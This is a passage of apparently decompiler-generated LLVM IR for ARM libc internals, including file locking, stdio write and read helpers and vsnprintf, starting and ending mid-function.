  br i1 %v7_12d58, label %._crit_edge2, label %dec_label_pc_12d60

._crit_edge2:                                     ; preds = %bb13
  %v0_12d78.pre = load i32, i32* @r4, align 4
  br label %bb15

dec_label_pc_12d60:                               ; preds = %bb13
  %v7_12d60 = icmp eq i8 %v2_12d50, 119
  %v0_12d64 = load i32, i32* @r4, align 4
  %v2_12d68.v1_12d64.v = select i1 %v7_12d60, i32 576, i32 64
  %v2_12d68.v1_12d64 = or i32 %v0_12d64, %v2_12d68.v1_12d64.v
  br i1 %v7_12d60, label %bb15, label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d60
  %v7_12d70 = icmp eq i8 %v2_12d50, 97
  br i1 %v7_12d70, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_12d70
  %v2_12d74 = or i32 %v2_12d68.v1_12d64, 1024
  br label %bb15

bb15:                                             ; preds = %._crit_edge2, %dec_label_pc_12d60, %dec_label_pc_12d70, %bb14
  %v0_12d78 = phi i32 [ %v0_12d78.pre, %._crit_edge2 ], [ %v2_12d68.v1_12d64, %dec_label_pc_12d60 ], [ %v2_12d68.v1_12d64, %dec_label_pc_12d70 ], [ %v2_12d74, %bb14 ]
  store i32 %v3_12d00, i32* @r4, align 4
  ret i32 %v0_12d78

; uselistorder directives
  uselistorder i1 %v7_12d60, { 1, 0 }
  uselistorder i32 %v0_12d30, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32)* @strchr, { 9, 8, 7, 6, 5, 4, 2, 1, 3, 0 }
  uselistorder label %bb15, { 3, 2, 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @___syscall3.13(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @__unlockfile(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_12dac = add i32 %arg1, 76
  store i32 %v1_12dac, i32* @r4, align 4
  %v0_12db0 = call i32 @__a_barrier()
  store i32 %v0_12db0, i32* @r0, align 4
  %v2_12db8 = add i32 %v0_12db0, 76
  %v3_12db8 = inttoptr i32 %v2_12db8 to i32*
  store i32 0, i32* %v3_12db8, align 4
  %v0_12dbc = call i32 @__a_barrier()
  %v1_12dc0 = add i32 %v0_12dbc, 80
  %v2_12dc0 = inttoptr i32 %v1_12dc0 to i32*
  %v3_12dc0 = load i32, i32* %v2_12dc0, align 4
  %v2_12dc4 = icmp eq i32 %v3_12dc0, 0
  br i1 %v2_12dc4, label %dec_label_pc_12e00, label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %entry
  %v0_12dd0 = load i32, i32* @r4, align 4
  %v4_12ddc = call i32 @___syscall3.13(i32 240, i32 %v0_12dd0, i32 129, i32 1)
  %v4_12de4 = icmp eq i32 %v4_12ddc, -38
  br i1 %v4_12de4, label %dec_label_pc_12de8, label %dec_label_pc_12e00

dec_label_pc_12de8:                               ; preds = %dec_label_pc_12dcc
  %v0_12dec = load i32, i32* @r4, align 4
  %v4_12dfc = call i32 @___syscall3.13(i32 240, i32 %v0_12dec, i32 1, i32 1)
  br label %dec_label_pc_12e00

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12dcc, %entry, %dec_label_pc_12de8
  %v1_12e04 = phi i32 [ %v4_12ddc, %dec_label_pc_12dcc ], [ %v0_12dbc, %entry ], [ %v4_12dfc, %dec_label_pc_12de8 ]
  ret i32 %v1_12e04

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @___syscall3.13, { 1, 0 }
  uselistorder i32 ()* @__a_barrier, { 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 6, 5, 4, 3, 14, 13, 12, 11, 10, 9, 8, 7 }
  uselistorder label %dec_label_pc_12e00, { 2, 0, 1 }
}

define i32 @__lockfile() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_12e08 = load i32, i32* @r4, align 4
  store i32 %v3_12e08, i32* %stack_var_-16, align 4
  %v6_12e08 = load i32, i32* @r5, align 4
  %v9_12e08 = load i32, i32* @r6, align 4
  %v0_12e0c = load i32, i32* @r0, align 4
  store i32 %v0_12e0c, i32* @r2, align 4
  %v0_12e10 = call i32 @__aeabi_read_tp()
  %v1_12e14 = add i32 %v0_12e10, -176
  %v2_12e14 = inttoptr i32 %v1_12e14 to i32*
  %v3_12e14 = load i32, i32* %v2_12e14, align 4
  store i32 %v3_12e14, i32* @r5, align 4
  %v0_12e18 = load i32, i32* @r2, align 4
  %v1_12e18 = add i32 %v0_12e18, 76
  %v2_12e18 = inttoptr i32 %v1_12e18 to i32*
  %v3_12e18 = load i32, i32* %v2_12e18, align 4
  %v9_12e1c = icmp eq i32 %v3_12e18, %v3_12e14
  store i1 %v9_12e1c, i1* @cpsr_z, align 1
  br i1 %v9_12e1c, label %dec_label_pc_12e6c, label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %entry
  %v1_12e28 = add i32 %v0_12e18, 80
  store i32 %v1_12e28, i32* @r6, align 4
  store i32 %v1_12e18, i32* @r4, align 4
  store i32 %v1_12e18, i32* @r2, align 4
  %v3_12e3c10 = call i32 @__a_cas(i32 0, i32 %v3_12e14, i32 %v1_12e18)
  %v2_12e4012 = icmp eq i32 %v3_12e3c10, 0
  br i1 %v2_12e4012, label %dec_label_pc_12e6c, label %dec_label_pc_12e4c

dec_label_pc_12e4c:                               ; preds = %dec_label_pc_12e28, %dec_label_pc_12e30.backedge
  %v0_12e4c = load i32, i32* @r4, align 4
  %v1_12e4c = inttoptr i32 %v0_12e4c to i32*
  %v2_12e4c = load i32, i32* %v1_12e4c, align 4
  store i32 %v2_12e4c, i32* @r2, align 4
  %v2_12e50 = icmp eq i32 %v2_12e4c, 0
  store i1 %v2_12e50, i1* @cpsr_z, align 1
  br i1 %v2_12e50, label %dec_label_pc_12e30.backedge, label %dec_label_pc_12e58

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e4c
  %v0_12e5c = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v5_12e64 = call i32 @__wait(i32* %v1_12e4c, i32 %v0_12e5c)
  %v0_12e34.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12e30.backedge

dec_label_pc_12e30.backedge:                      ; preds = %dec_label_pc_12e58, %dec_label_pc_12e4c
  %v0_12e34.pre = phi i32 [ %v0_12e34.pre.pre, %dec_label_pc_12e58 ], [ %v0_12e4c, %dec_label_pc_12e4c ]
  %v0_12e30.pre = load i32, i32* @r5, align 4
  store i32 %v0_12e34.pre, i32* @r2, align 4
  %v3_12e3c = call i32 @__a_cas(i32 0, i32 %v0_12e30.pre, i32 %v0_12e34.pre)
  %v2_12e40 = icmp eq i32 %v3_12e3c, 0
  br i1 %v2_12e40, label %dec_label_pc_12e6c, label %dec_label_pc_12e4c

dec_label_pc_12e6c:                               ; preds = %dec_label_pc_12e28, %dec_label_pc_12e30.backedge, %entry
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_12e30.backedge ], [ 1, %dec_label_pc_12e28 ]
  %v2_12e6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12e6c, i32* @r4, align 4
  store i32 %v6_12e08, i32* @r5, align 4
  store i32 %v9_12e08, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__wait, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__a_cas, { 4, 0, 21, 1, 5, 22, 3, 20, 19, 18, 17, 16, 15, 14, 13, 12, 2, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 -176, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e4c, { 1, 0 }
}

define i32 @__stdio_write(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_12e7c = add i32 %tmp, 20
  %v2_12e7c = inttoptr i32 %v1_12e7c to i32*
  %v3_12e7c = load i32, i32* %v2_12e7c, align 4
  store i32 %v3_12e7c, i32* %r3.global-to-local, align 4
  %v1_12e80 = add i32 %tmp, 28
  %v2_12e80 = inttoptr i32 %v1_12e80 to i32*
  %v3_12e80 = load i32, i32* %v2_12e80, align 4
  %v2_12e84 = ptrtoint i32* %stack_var_-48 to i32
  %v2_12e88 = sub i32 %v3_12e7c, %v3_12e80
  store i32 %v2_12e88, i32* %r3.global-to-local, align 4
  store i32 %v3_12e80, i32* %stack_var_-48, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  %v2_12ea0 = add i32 %v2_12e88, %arg3
  store i32 %v2_12ea0, i32* %r6.global-to-local, align 4
  store i32 %v2_12e84, i32* %r5.global-to-local, align 4
  store i32 2, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %bb31, %entry
  %v0_12eb8 = phi i32 [ %v0_12eb8.pre, %bb31 ], [ 2, %entry ]
  %v0_12eb0 = phi i32 [ %v0_12eb0.pre, %bb31 ], [ %tmp, %entry ]
  %v1_12eb0 = add i32 %v0_12eb0, 60
  %v2_12eb0 = inttoptr i32 %v1_12eb0 to i32*
  %v3_12eb0 = load i32, i32* %v2_12eb0, align 4
  store i32 %v3_12eb0, i32* @r0, align 4
  store i32 %v0_12eb8, i32* @r2, align 4
  %v0_12ec0 = call i32 @__syscall_ret()
  %v1_12ec4 = load i32, i32* %r6.global-to-local, align 4
  %v9_12ec4 = icmp eq i32 %v1_12ec4, %v0_12ec0
  br i1 %v9_12ec4, label %dec_label_pc_12ed0, label %dec_label_pc_12eec

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12eac
  %v0_12ed0 = load i32, i32* @r4, align 4
  %v1_12ed0 = add i32 %v0_12ed0, 44
  store i32 %v1_12ed0, i32* %r2.global-to-local, align 4
  %v1_12ed4 = inttoptr i32 %v1_12ed0 to i32*
  %v2_12ed4 = load i32, i32* %v1_12ed4, align 4
  store i32 %v2_12ed4, i32* %r2.global-to-local, align 4
  %v3_12ed4 = add i32 %v0_12ed0, 48
  %v4_12ed4 = inttoptr i32 %v3_12ed4 to i32*
  %v5_12ed4 = load i32, i32* %v4_12ed4, align 4
  %v2_12ed8 = add i32 %v5_12ed4, %v2_12ed4
  store i32 %v2_12ed8, i32* %r3.global-to-local, align 4
  %v2_12edc = add i32 %v0_12ed0, 20
  %v3_12edc = inttoptr i32 %v2_12edc to i32*
  store i32 %v2_12ed4, i32* %v3_12edc, align 4
  %v0_12ee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12ee0 = load i32, i32* @r4, align 4
  %v2_12ee0 = add i32 %v1_12ee0, 16
  %v3_12ee0 = inttoptr i32 %v2_12ee0 to i32*
  store i32 %v0_12ee0, i32* %v3_12ee0, align 4
  %v0_12ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ee4 = load i32, i32* @r4, align 4
  %v2_12ee4 = add i32 %v1_12ee4, 28
  %v3_12ee4 = inttoptr i32 %v2_12ee4 to i32*
  store i32 %v0_12ee4, i32* %v3_12ee4, align 4
  br label %dec_label_pc_12f58

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12eac
  %v1_12eec = icmp slt i32 %v0_12ec0, 0
  br i1 %v1_12eec, label %dec_label_pc_12ef4, label %dec_label_pc_12f24

dec_label_pc_12ef4:                               ; preds = %dec_label_pc_12eec
  %v0_12ef4 = load i32, i32* @r4, align 4
  %v1_12ef4 = inttoptr i32 %v0_12ef4 to i32*
  %v2_12ef4 = load i32, i32* %v1_12ef4, align 4
  %v1_12ef8 = or i32 %v2_12ef4, 32
  store i32 %v1_12ef8, i32* %r3.global-to-local, align 4
  store i32 %v1_12ef8, i32* %v1_12ef4, align 4
  %v0_12f00 = load i32, i32* %sl.global-to-local, align 4
  %v7_12f00 = icmp eq i32 %v0_12f00, 2
  br i1 %v7_12f00, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12ef4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb28

.thread1:                                         ; preds = %dec_label_pc_12ef4
  %v1_12f04 = load i32, i32* %r5.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 4
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  %v4_12f04 = load i32, i32* %v3_12f04, align 4
  store i32 %v4_12f04, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_12f10.pre = load i32, i32* %r8.global-to-local, align 4
  %v3_12f10 = sub i32 %v2_12f10.pre, %v4_12f04
  br label %bb28

bb28:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v3_12f10, %.thread1 ], [ 0, %bb ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v1_12f14 = load i32, i32* @r4, align 4
  %v2_12f14 = add i32 %v1_12f14, 16
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  store i32 0, i32* %v3_12f14, align 4
  %v0_12f18 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f18 = load i32, i32* @r4, align 4
  %v2_12f18 = add i32 %v1_12f18, 28
  %v3_12f18 = inttoptr i32 %v2_12f18 to i32*
  store i32 %v0_12f18, i32* %v3_12f18, align 4
  %v0_12f1c = load i32, i32* %r2.global-to-local, align 4
  %v1_12f1c = load i32, i32* @r4, align 4
  %v2_12f1c = add i32 %v1_12f1c, 20
  %v3_12f1c = inttoptr i32 %v2_12f1c to i32*
  store i32 %v0_12f1c, i32* %v3_12f1c, align 4
  br label %dec_label_pc_12f58

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12eec
  %v0_12f24 = load i32, i32* %r5.global-to-local, align 4
  %v1_12f24 = add i32 %v0_12f24, 4
  %v2_12f24 = inttoptr i32 %v1_12f24 to i32*
  %v3_12f24 = load i32, i32* %v2_12f24, align 4
  store i32 %v3_12f24, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_12ec0, %v3_12f24
  br i1 %tmp32, label %bb29, label %.thread15

bb29:                                             ; preds = %dec_label_pc_12f24
  %v2_12f28 = sub i32 %v0_12ec0, %v3_12f24
  %v5_12f2c = add i32 %v0_12f24, 8
  store i32 %v5_12f2c, i32* %r5.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %dec_label_pc_12f24, %bb29
  %v1_12f4c13 = phi i32 [ %v5_12f2c, %bb29 ], [ %v0_12f24, %dec_label_pc_12f24 ]
  %v0_12f3c = phi i32 [ %v2_12f28, %bb29 ], [ %v0_12ec0, %dec_label_pc_12f24 ]
  %v1_12f34 = add i32 %v1_12f4c13, 4
  %v2_12f34 = inttoptr i32 %v1_12f34 to i32*
  %v3_12f34 = load i32, i32* %v2_12f34, align 4
  store i32 %v3_12f34, i32* %r2.global-to-local, align 4
  %v1_12f38 = inttoptr i32 %v1_12f4c13 to i32*
  %v2_12f38 = load i32, i32* %v1_12f38, align 4
  %v2_12f3c = sub i32 %v3_12f34, %v0_12f3c
  store i32 %v2_12f3c, i32* %r2.global-to-local, align 4
  %v2_12f40 = add i32 %v2_12f38, %v0_12f3c
  store i32 %v2_12f40, i32* %r3.global-to-local, align 4
  br i1 %tmp32, label %bb30, label %bb31

bb30:                                             ; preds = %.thread15
  %v4_12f44 = load i32, i32* %sl.global-to-local, align 4
  %v5_12f44 = add i32 %v4_12f44, -1
  store i32 %v5_12f44, i32* %sl.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread15, %bb30
  %v2_12f48 = sub i32 %v1_12ec4, %v0_12ec0
  store i32 %v2_12f48, i32* %r6.global-to-local, align 4
  store i32 %v2_12f40, i32* %v1_12f38, align 4
  %v0_12f50 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f50 = load i32, i32* %r5.global-to-local, align 4
  %v2_12f50 = add i32 %v1_12f50, 4
  %v3_12f50 = inttoptr i32 %v2_12f50 to i32*
  store i32 %v0_12f50, i32* %v3_12f50, align 4
  %v0_12eb0.pre = load i32, i32* @r4, align 4
  %v0_12eb8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12f58:                               ; preds = %bb28, %dec_label_pc_12ed0
  %v0_12f58 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_12f58

; uselistorder directives
  uselistorder i32 %v1_12f4c13, { 1, 0 }
  uselistorder i1 %tmp32, { 1, 0 }
  uselistorder i32 %v3_12f24, { 1, 0, 2 }
  uselistorder i32 %v2_12ed4, { 1, 0, 2 }
  uselistorder i32 %v1_12ec4, { 1, 0 }
  uselistorder i32 %v0_12ec0, { 3, 2, 5, 0, 4, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 9, 4, 10, 5, 6, 7, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__towrite(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_12f68 = add i32 %tmp, 74
  %v2_12f68 = inttoptr i32 %v1_12f68 to i8*
  %v3_12f68 = load i8, i8* %v2_12f68, align 1
  %v4_12f68 = zext i8 %v3_12f68 to i32
  store i32 %v4_12f68, i32* %r2.global-to-local, align 4
  %v2_12f6c = load i32, i32* %arg1, align 4
  store i32 %v2_12f6c, i32* @r1, align 4
  %v1_12f70 = add i8 %v3_12f68, -1
  %v2_12f74 = or i8 %v1_12f70, %v3_12f68
  %v1_12f78 = and i32 %v2_12f6c, 8
  store i32 %v1_12f78, i32* @ip, align 4
  %v2_12f78 = icmp eq i32 %v1_12f78, 0
  store i1 %v2_12f78, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_12f74, i8* %v2_12f68, align 1
  %v0_12f80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12f80, label %dec_label_pc_12f90, label %.thread1.dec_label_pc_12fb4_crit_edge

.thread1.dec_label_pc_12fb4_crit_edge:            ; preds = %entry
  %v1_12f80 = load i32, i32* @r1, align 4
  %v2_12f80 = or i32 %v1_12f80, 32
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v2_12f80, i32* %arg1, align 4
  br label %dec_label_pc_12fb4

dec_label_pc_12f90:                               ; preds = %entry
  %v1_12f90 = add i32 %tmp, 44
  store i32 %v1_12f90, i32* %r2.global-to-local, align 4
  %v1_12f94 = inttoptr i32 %v1_12f90 to i32*
  %v2_12f94 = load i32, i32* %v1_12f94, align 4
  store i32 %v2_12f94, i32* %r2.global-to-local, align 4
  %v3_12f94 = add i32 %tmp, 48
  %v4_12f94 = inttoptr i32 %v3_12f94 to i32*
  %v5_12f94 = load i32, i32* %v4_12f94, align 4
  %v2_12f98 = add i32 %v5_12f94, %v2_12f94
  %v2_12f9c = add i32 %tmp, 16
  %v3_12f9c = inttoptr i32 %v2_12f9c to i32*
  store i32 %v2_12f98, i32* %v3_12f9c, align 4
  %v0_12fa0 = load i32, i32* @ip, align 4
  %v2_12fa0 = add i32 %tmp, 8
  %v3_12fa0 = inttoptr i32 %v2_12fa0 to i32*
  store i32 %v0_12fa0, i32* %v3_12fa0, align 4
  %v0_12fa4 = load i32, i32* @ip, align 4
  %v2_12fa4 = add i32 %tmp, 4
  %v3_12fa4 = inttoptr i32 %v2_12fa4 to i32*
  store i32 %v0_12fa4, i32* %v3_12fa4, align 4
  %v0_12fa8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12fa8 = add i32 %tmp, 28
  %v3_12fa8 = inttoptr i32 %v2_12fa8 to i32*
  store i32 %v0_12fa8, i32* %v3_12fa8, align 4
  %v0_12fac = load i32, i32* %r2.global-to-local, align 4
  %v2_12fac = add i32 %tmp, 20
  %v3_12fac = inttoptr i32 %v2_12fac to i32*
  store i32 %v0_12fac, i32* %v3_12fac, align 4
  %v0_12fb0 = load i32, i32* @ip, align 4
  store i32 %v0_12fb0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12fb4

dec_label_pc_12fb4:                               ; preds = %.thread1.dec_label_pc_12fb4_crit_edge, %dec_label_pc_12f90
  %v0_12fb4 = phi i32 [ -1, %.thread1.dec_label_pc_12fb4_crit_edge ], [ %v0_12fb0, %dec_label_pc_12f90 ]
  ret i32 %v0_12fb4

; uselistorder directives
  uselistorder i32 %tmp, { 2, 3, 0, 1, 6, 5, 4, 7 }
  uselistorder label %dec_label_pc_12fb4, { 1, 0 }
}

define i32 @__towrite_needs_stdio_exit() local_unnamed_addr {
entry:
  %v0_12fc4 = call i32 @__stdio_exit()
  ret i32 %v0_12fc4
}

define i32 @__uflow(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %v3_12fd4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_12fe0 = call i32 @__toread()
  store i32 %v0_12fe0, i32* %r0.global-to-local, align 4
  %v2_12fe4 = icmp eq i32 %v0_12fe0, 0
  br i1 %v2_12fe4, label %dec_label_pc_12fec, label %dec_label_pc_13014

dec_label_pc_12fec:                               ; preds = %entry
  %v0_12fec = load i32, i32* @r4, align 4
  store i32 %v0_12fec, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v1_12ff8 = add i32 %v0_12fec, 32
  %v2_12ff8 = inttoptr i32 %v1_12ff8 to i32*
  %v3_12ff8 = load i32, i32* %v2_12ff8, align 4
  store i32 %v3_12ff8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_12ff8)
  %v0_13004 = load i32, i32* %r0.global-to-local, align 4
  %v7_13004 = icmp eq i32 %v0_13004, 1
  br i1 %v7_13004, label %bb, label %dec_label_pc_13014

bb:                                               ; preds = %dec_label_pc_12fec
  %v4_13008 = load i8, i8* %stack_var_-9, align 1
  %v5_13008 = sext i8 %v4_13008 to i32
  br label %dec_label_pc_13014

dec_label_pc_13014:                               ; preds = %entry, %dec_label_pc_12fec, %bb
  %storemerge = phi i32 [ %v5_13008, %bb ], [ -1, %dec_label_pc_12fec ], [ -1, %entry ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_12fd4, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13014, { 2, 1, 0 }
}

define i32 @__ofl_add(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v0_13028 = call i32 @__ofl_lock()
  %v1_1302c = inttoptr i32 %v0_13028 to i32*
  %v2_1302c = load i32, i32* %v1_1302c, align 4
  %v1_13030 = load i32, i32* @r4, align 4
  %v2_13030 = add i32 %v1_13030, 56
  %v3_13030 = inttoptr i32 %v2_13030 to i32*
  store i32 %v2_1302c, i32* %v3_13030, align 4
  %v2_13034 = load i32, i32* %v1_1302c, align 4
  %v2_13038 = icmp eq i32 %v2_13034, 0
  br i1 %v2_13038, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v1_1303c = load i32, i32* @r4, align 4
  %v3_1303c = add i32 %v2_13034, 52
  %v4_1303c = inttoptr i32 %v3_1303c to i32*
  store i32 %v1_1303c, i32* %v4_1303c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_13040 = load i32, i32* @r4, align 4
  store i32 %v0_13040, i32* %v1_1302c, align 4
  %v0_13044 = call i32 @__ofl_unlock()
  %v0_13048 = load i32, i32* @r4, align 4
  ret i32 %v0_13048

; uselistorder directives
  uselistorder i32 ()* @__ofl_unlock, { 2, 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @vsnprintf() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %v3_13054 = load i32, i32* @r4, align 4
  %v6_13054 = load i32, i32* @r5, align 4
  %v9_13054 = load i32, i32* @r6, align 4
  %v12_13054 = load i32, i32* @r7, align 4
  %v15_13054 = load i32, i32* @r8, align 4
  %v2_13058 = ptrtoint i32* %stack_var_-176 to i32
  %v0_1305c = load i32, i32* @r1, align 4
  store i32 %v0_1305c, i32* @r5, align 4
  %v0_13060 = load i32, i32* @r0, align 4
  store i32 %v0_13060, i32* @r6, align 4
  %v0_13064 = load i32, i32* @r2, align 4
  store i32 %v0_13064, i32* @r8, align 4
  store i32 %v2_13058, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_13074 = load i32, i32* @r3, align 4
  store i32 %v0_13074, i32* @r7, align 4
  %v0_13078 = call i32 @memset()
  %v0_1307c = load i32, i32* @r5, align 4
  %v1_1307c = add i32 %v0_1307c, -1
  %v8_13080 = icmp eq i32 %v0_1307c, 2147483647
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13098 = icmp ult i32 %v1_1307c, 2147483646
  %v3_13098 = or i1 %v8_13080, %v2_13098
  br i1 %v3_13098, label %entry.dec_label_pc_130c0_crit_edge, label %dec_label_pc_1309c

entry.dec_label_pc_130c0_crit_edge:               ; preds = %entry
  %v0_130c0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_130c0

dec_label_pc_1309c:                               ; preds = %entry
  %v2_1309c = icmp eq i32 %v0_1307c, 0
  br i1 %v2_1309c, label %.thread, label %dec_label_pc_130ac

.thread:                                          ; preds = %dec_label_pc_1309c
  %v3_130a0 = ptrtoint i32* %stack_var_-25 to i32
  store i32 %v3_130a0, i32* @r6, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_130c0

dec_label_pc_130ac:                               ; preds = %dec_label_pc_1309c
  %v0_130ac = call i32 @__errno_location()
  %v0_130b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_130b4, i32* %ip.global-to-local, align 4
  %v2_130b8 = inttoptr i32 %v0_130ac to i32*
  store i32 75, i32* %v2_130b8, align 4
  br label %dec_label_pc_13120

dec_label_pc_130c0:                               ; preds = %.thread, %entry.dec_label_pc_130c0_crit_edge
  %v1_130cc = phi i32 [ %v0_1307c, %entry.dec_label_pc_130c0_crit_edge ], [ 1, %.thread ]
  %v2_1311c = phi i32 [ %v0_130c0.pre, %entry.dec_label_pc_130c0_crit_edge ], [ %v3_130a0, %.thread ]
  %v1_130c4 = sub i32 -2, %v2_1311c
  %v3_130c8 = icmp ult i32 %v1_130c4, %v1_130cc
  br i1 %v3_130c8, label %bb23, label %bb

bb:                                               ; preds = %dec_label_pc_130c0
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_130c0, %bb
  %storemerge = phi i32 [ %v1_130cc, %bb ], [ %v1_130c4, %dec_label_pc_130c0 ]
  %v1_130d0 = phi i32 [ %v1_130cc, %bb ], [ %v1_130c4, %dec_label_pc_130c0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v2_130d0 = add i32 %v1_130d0, %v2_1311c
  %v0_130d4 = load i32, i32* @r8, align 4
  %v0_130d8 = load i32, i32* @r7, align 4
  %v8_130f4 = call i32 @vfprintf(i32* nonnull %stack_var_-176, i32 %v0_130d4, i32 %v0_130d8, i32 %v2_130d0, i32 %v2_130d0, i32 %v2_1311c, i32 %v2_130d0)
  %v0_130f8 = load i32, i32* @r4, align 4
  %v2_130f8 = icmp eq i32 %v0_130f8, 0
  store i32 %v8_130f4, i32* %ip.global-to-local, align 4
  br i1 %v2_130f8, label %dec_label_pc_13120, label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %bb23
  store i32 %v2_1311c, i32* @r1, align 4
  %v9_1310c = icmp eq i32 %v1_130d0, 0
  %. = sext i1 %v9_1310c to i32
  %v4_1311c = add i32 %., %v2_1311c
  %v5_1311c = inttoptr i32 %v4_1311c to i8*
  store i8 0, i8* %v5_1311c, align 1
  br label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %bb23, %dec_label_pc_130ac, %dec_label_pc_13104
  %v0_13120 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v3_13054, i32* @r4, align 4
  store i32 %v6_13054, i32* @r5, align 4
  store i32 %v9_13054, i32* @r6, align 4
  store i32 %v12_13054, i32* @r7, align 4
  store i32 %v15_13054, i32* @r8, align 4
  ret i32 %v0_13120

; uselistorder directives
  uselistorder i32 %v2_130d0, { 0, 2, 1 }
  uselistorder i32 %v1_130d0, { 1, 0 }
  uselistorder i32 %v2_1311c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_1307c, { 1, 2, 0, 3 }
